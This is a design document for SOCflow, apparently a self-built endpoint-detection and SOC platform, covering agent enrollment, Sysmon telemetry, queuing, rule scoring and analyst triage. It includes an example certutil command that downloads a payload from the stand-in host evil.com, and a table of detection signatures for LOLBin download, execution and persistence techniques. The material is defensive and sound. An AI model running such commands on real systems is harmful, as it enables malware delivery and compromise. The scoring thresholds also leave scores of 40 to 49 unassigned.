# SOCflow Working Model & Operational Mechanics

This document explains the end-to-end working mechanics of the **SOCflow** platform, covering how each subsystem initializes, communicates, processes data, and responds to threats.

---

## 1. End-to-End Operational Lifecycle

The operation of SOCflow flows through 5 interconnected phases:

```
[ Phase 1: Endpoint Setup & Handshake ]
                  │
                  ▼
[ Phase 2: Telemetry Collection & Transport ]
                  │
                  ▼
[ Phase 3: Message Ingestion & Event Queuing ]
                  │
                  ▼
[ Phase 4: Threat Evaluation & Scoring ]
                  │
                  ▼
[ Phase 5: SOC Analyst Triage & Incident Resolution ]
```

---

## 2. Phase-by-Phase Working Mechanism

### Phase 1: Endpoint Enrollment & Handshake
1. The SOC Manager provisions an endpoint enrollment secret (e.g., `SOCflow-Enroll-2026!`) from the web interface.
2. The agent package is distributed to a Windows endpoint containing `agent_gui.py`, `agent_core.py`, and `requirements.txt`.
3. The administrator executes `agent_gui.py`:
   - A Tkinter dialog opens requesting **Server IP** and **Enrollment Key**.
   - Clicking **Connect & Enroll** initiates a POST request to `/api/enroll` with hostname, OS information, and the secret.
   - The server validates the token against `soc_enrollment_tokens`. Upon success, it inserts records into `soc_host` and `soc_agent` and responds with an allocated `agent_id` (UUID format).
   - The GUI writes the server URL into `agent_settings.json` and credentials into `agent_config.json`.
   - The GUI terminates and transparently launches `agent_core.py` in the background.

### Phase 2: Telemetry Collection & Extraction
1. `agent_core.py` reads local credentials from `agent_config.json`.
2. The agent attaches to the Windows Event Subsystem using `pywin32` (`win32evtlog.EvtQuery`).
3. It targets the event channel:
   ```
   Channel: Microsoft-Windows-Sysmon/Operational
   Event ID: 1 (Process Creation)
   ```
4. For every process execution, the raw event XML is parsed into standard properties:
   - `process_name` (e.g., `certutil.exe`)
   - `command_line` (e.g., `certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe`)
   - `parent_process` (e.g., `cmd.exe`)
   - `user_name` (e.g., `NT AUTHORITY\SYSTEM` or `DOMAIN\user`)
   - `file_path`, `process_id`, `parent_process_id`, and `hash_sha256`
5. Process events are collected into an in-memory queue.
6. The queue flushes when **50 events are accumulated** or after a **10-second timeout**, sending a JSON POST payload to `/api/logs`.
7. Concurrently, system metrics (CPU %, RAM %, Disk %) are sampled via `psutil` and transmitted to `/api/telemetry`.

### Phase 3: Ingestion & Asynchronous Queuing
1. The Node.js Express server receives the log batch at `/api/logs`.
2. It verifies that the `agent_id` is registered and active in the database.
3. The server performs a bulk batch insert into MySQL (`soc_process_event` table), creating rows with unique `event_id` auto-increment counters.
4. Instead of blocking the HTTP response with computationally expensive regex matching, the Node.js API acts as a publisher:
   - For each inserted event, it sends an `LPUSH` command to Redis with the event payload into `socflow_events_queue`.
5. The API responds with `HTTP 200 { "status": "ok", "ingested": N }` back to the endpoint in milliseconds.

### Phase 4: Real-Time Detection & Threat Scoring
1. The Python Detection Service (`analyzer.py`) runs as a persistent system daemon.
2. It listens to Redis via a blocking pop:
   ```python
   _, raw_event = redis_client.blpop("socflow_events_queue", timeout=5)
   ```
3. When an event arrives, it evaluates the `process_name` and `command_line` against all active rules in `soc_detection_rule`.
4. **Scoring Logic**:
   - **Binary Weight**: Known LOLBin binaries (`powershell.exe`, `certutil.exe`, `bitsadmin.exe`, `mshta.exe`, `rundll32.exe`, `wmic.exe`, `regsvr32.exe`, `cscript.exe`) contribute base points.
   - **Command-line Switches**: Evasive flags such as `-encodedcommand`, `-windowstyle hidden`, `-urlcache`, `/addfile`, `javascript:`, and `/transfer` contribute high-weight multipliers.
   - **Path Suspicion**: Execution originating from user-writable paths like `C:\Windows\Temp\`, `\AppData\Roaming\`, or alternate data streams.
5. **Confidence Score Calculation**:
   - The final score is normalized from 0 to 100.
   - If `score >= 85`: **Critical**
   - If `70 <= score < 85`: **High**
   - If `50 <= score < 70`: **Medium**
   - If `score < 40`: **Low / Suppressed**. The system saves the alert directly with status `closed` to reduce analyst notification overload.
6. Triggered alerts are inserted into `soc_alert_reference` referencing the original `event_id` and tagged with relevant MITRE ATT&CK techniques (e.g., T1059.001, T1105, T1218).

### Phase 5: Analyst Investigation & Case Resolution
1. SOC Analysts monitor incoming incidents via `/alerts` in real time.
2. Unreviewed alerts appear under the **New** filter.
3. The analyst clicks an alert to inspect:
   - Full command line string and decoded arguments
   - Parent process hierarchy
   - Executing user account and targeted host
   - MITRE ATT&CK tactical category and confidence breakdown
4. The analyst transitions the alert state:
   - **Acknowledge**: Moves alert to `open` status and logs an entry in `soc_acknowledgement`.
   - **Create / Link Case**: The analyst binds related alerts into an incident case via `soc_case` and `soc_case_alerts`.
   - **Log Explorer Query**: The analyst pivots to `/explorer` to inspect historical logs from the same endpoint 30 minutes prior to and after the execution.
   - **Resolve / Close**: Once remediated, the case is marked `closed` with investigation notes recorded in `soc_case_note`.

---

## 3. The 14 Standard LOLBin Detection Rules

| Rule ID | Rule Name | Target Binary | Targeted MITRE Technique | Key Detection Signature |
|---|---|---|---|---|
| **1** | Certutil Remote Download | `certutil.exe` | T1105 | `-urlcache`, `-split`, `-f`, `http://`, `https://` |
| **2** | PowerShell Encoded Command | `powershell.exe`, `pwsh.exe` | T1059.001 | `-enc`, `-encodedcommand`, `-e ` |
| **3** | PowerShell Download Cradle | `powershell.exe` | T1059.001 | `DownloadFile`, `DownloadString`, `Invoke-WebRequest`, `iwr` |
| **4** | MSHTA Remote Script | `mshta.exe` | T1218.005 | `http://`, `https://`, `javascript:`, `vbscript:` |
| **5** | Rundll32 Inline Script / URL | `rundll32.exe` | T1218.011 | `javascript:`, `url.dll`, `OpenURL`, `http://` |
| **6** | Regsvr32 Remote Scriptlet (Squiblydoo) | `regsvr32.exe` | T1218.010 | `/s`, `/n`, `/u`, `/i:http`, `.sct` |
| **7** | WMIC Remote Process Call | `wmic.exe` | T1047 | `process call create`, `/node:` |
| **8** | BITSAdmin Remote File Transfer | `bitsadmin.exe` | T1197 | `/transfer`, `/addfile`, `/download` |
| **9** | Scheduled Task Persistence | `schtasks.exe` | T1053.005 | `/create`, `/sc`, `/tr`, `/tn` |
| **10** | Net User / Group Manipulation | `net.exe`, `net1.exe` | T1087, T1136 | `user /add`, `localgroup administrators` |
| **11** | CScript/WScript Remote Execution | `cscript.exe`, `wscript.exe` | T1059.005 | `.vbs`, `.js`, `/e:vbscript`, `http://` |
| **12** | CMSTP Profile Execution | `cmstp.exe` | T1218.003 | `/ni`, `/s`, `.inf` |
| **13** | InstallUtil Assembly Bypass | `installutil.exe` | T1218.004 | `/logfile=`, `/u` |
| **14** | Regsvcs / Regasm Bypass | `regsvcs.exe`, `regasm.exe` | T1218.009 | `/u`, `/codebase` |

---

## 4. Resilience & Fail-Safe Mechanics

* **Agent Resilience**: If the network connection drops between endpoint and server, `agent_core.py` retries with backoff and avoids crashing.
* **Queue Decoupling**: If the Python detection engine undergoes updates or service restarts, the Redis queue stores incoming events without dropping telemetry or stalling the HTTP ingest server.
* **Auto-Restart Daemons**: Both `socflow-backend.service` and `socflow-engine.service` run under `systemd` with `Restart=on-failure`.
